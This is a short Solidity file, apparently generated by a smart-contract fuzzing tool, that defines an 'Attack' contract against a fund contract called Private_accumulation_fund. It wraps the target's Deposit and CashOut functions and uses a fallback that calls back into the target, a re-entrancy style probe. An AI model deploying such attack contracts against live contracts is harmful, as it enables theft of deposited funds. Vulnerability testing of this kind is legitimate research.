pragma solidity ^0.4.19;

import "/home/hjwang/Tools/ContraMaster/contracts/Private_accumulation_fund.sol";

contract Attack_Private_accumulation_fund0 {

  Private_accumulation_fund public target_contract;

  function Attack_Private_accumulation_fund0(address _targetContract) public payable {
      target_contract = Private_accumulation_fund(_targetContract);
  } 

  function vultron_Deposit(uint256 vultron_amount) public payable{
    target_contract.Deposit.value(vultron_amount)();
  } 

  function vultron_CashOut(uint256 vultron_amount, uint256 _am) public payable{
    target_contract.CashOut.value(vultron_amount)(_am);
  } 

      function() public payable {
        
        target_contract.Deposit();
      }
      } 
